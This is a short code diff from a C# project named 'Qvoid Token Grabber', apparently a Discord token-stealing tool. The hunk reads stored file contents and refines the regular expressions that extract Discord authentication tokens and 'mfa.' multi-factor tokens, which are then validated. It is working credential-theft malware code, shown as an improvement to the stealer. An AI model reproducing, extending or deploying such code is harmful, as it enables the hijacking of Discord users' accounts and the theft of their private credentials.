@@ -800,8 +800,8 @@ namespace Qvoid_Token_Grabber.Discord
                                 using (StreamReader sr = new StreamReader(fs))
                                     fileContent = sr.ReadToEnd();
 
-                                MatchCollection matches = Regex.Matches(fileContent, "(\\w|\\d){24}.(\\w|\\d|_|-){6}.(\\w|\\d|_|-){27}");
-                                MatchCollection mfaMatches = Regex.Matches(fileContent, "mfa.(\\w|\\d|_|-){84}");
+                                MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
+                                MatchCollection mfaMatches = Regex.Matches(fileContent, @"mfa\.[\w-]{84}");
 
                                 foreach (Match match in matches)
                                     if (IsValidToken(match.Value))
